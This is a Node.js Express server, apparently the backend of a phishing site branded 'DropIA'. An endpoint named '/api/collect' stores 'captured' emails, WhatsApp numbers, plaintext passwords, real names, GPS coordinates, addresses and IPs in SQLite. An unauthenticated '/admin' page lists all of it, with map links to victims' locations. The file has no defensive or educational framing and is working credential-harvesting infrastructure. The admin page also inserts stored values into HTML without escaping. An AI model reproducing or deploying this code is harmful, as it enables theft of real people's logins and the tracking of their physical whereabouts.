const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

// Configuración de la Base de Datos SQLite
const dbPath = path.join(__dirname, '../data/database.sqlite');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('Error al abrir la base de datos:', err.message);
    } else {
        console.log('Conectado a la base de datos SQLite.');
        db.run(`CREATE TABLE IF NOT EXISTS captured_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            type TEXT,
            email TEXT,
            whatsapp TEXT,
            password TEXT,
            name TEXT,
            location_lat REAL,
            location_lon REAL,
            address TEXT,
            city TEXT,
            ip TEXT,
            cart TEXT
        )`);
    }
});

// Endpoint para capturar datos
app.post('/api/collect', (req, res) => {
    const d = req.body;
    const timestamp = new Date().toISOString();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const query = `INSERT INTO captured_data 
        (timestamp, type, email, whatsapp, password, name, location_lat, location_lon, address, city, ip, cart) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
    
    const params = [
        timestamp,
        d.type || 'unknown',
        d.email || '',
        d.whatsapp || '',
        d.password || '',
        d.name || '',
        d.location ? d.location.lat : null,
        d.location ? d.location.lon : null,
        d.address || '',
        d.city || '',
        ip,
        d.cart ? JSON.stringify(d.cart) : null
    ];

    db.run(query, params, function(err) {
        if (err) {
            console.error(err.message);
            return res.status(500).send('Error');
        }
        res.status(200).send({ status: 'ok', id: this.lastID });
    });
});

// Vista administrativa de datos (Estilo Excel)
app.get('/admin', (req, res) => {
    db.all(`SELECT * FROM captured_data ORDER BY id DESC`, [], (err, rows) => {
        if (err) {
            return res.status(500).send('Error al recuperar datos');
        }

        let html = `<html><head><title>Admin - DB DropIA</title><style>
            body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; }
            .container { background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 20px; overflow-x: auto; }
            table { width: 100%; border-collapse: collapse; min-width: 1000px; }
            th, td { border: 1px solid #e0e0e0; padding: 12px; text-align: left; font-size: 14px; }
            th { background-color: #FF4500; color: white; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
            tr:nth-child(even) { background-color: #f8f9fa; }
            tr:hover { background-color: #fff3ef; }
            h1 { color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
            .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #eee; }
            .type-login { background: #d1ecf1; color: #0c5460; }
            .type-location { background: #d4edda; color: #155724; }
            .type-address { background: #fff3cd; color: #856404; }
        </style></head><body>
        <div class="container">
            <h1><span style="color:#FF4500">DropIA</span> Base de Datos de Usuarios (SQLite)</h1>
            <table>
                <tr>
                    <th>ID</th>
                    <th>Fecha / Hora</th>
                    <th>Evento</th>
                    <th>Email / WhatsApp</th>
                    <th>Contraseña</th>
                    <th>Nombre Real</th>
                    <th>Ubicación (GPS)</th>
                    <th>Dirección Completa</th>
                    <th>Dispositivo / IP</th>
                </tr>`;
        
        rows.forEach(d => {
            const typeClass = d.type ? `type-${d.type.split('_')[0]}` : '';
            html += `<tr>
                <td>${d.id}</td>
                <td>${d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A'}</td>
                <td><span class="badge ${typeClass}">${d.type || 'unknown'}</span></td>
                <td><b>${d.email || ''}</b><br><small>${d.whatsapp || ''}</small></td>
                <td><code>${d.password || ''}</code></td>
                <td>${d.name || ''}</td>
                <td>${(d.location_lat && d.location_lon) ? `<a href="https://www.google.com/maps?q=${d.location_lat},${d.location_lon}" target="_blank">Lat: ${d.location_lat.toFixed(5)}<br>Lon: ${d.location_lon.toFixed(5)}</a>` : 'No GPS'}</td>
                <td>${d.address || ''}<br><small>${d.city || ''}</small></td>
                <td><small>${d.ip || ''}</small></td>
            </tr>`;
        });
        
        html += `</table></div></body></html>`;
        res.send(html);
    });
});

app.listen(PORT, () => console.log(`Servidor DropIA Activo: http://localhost:${PORT}`));
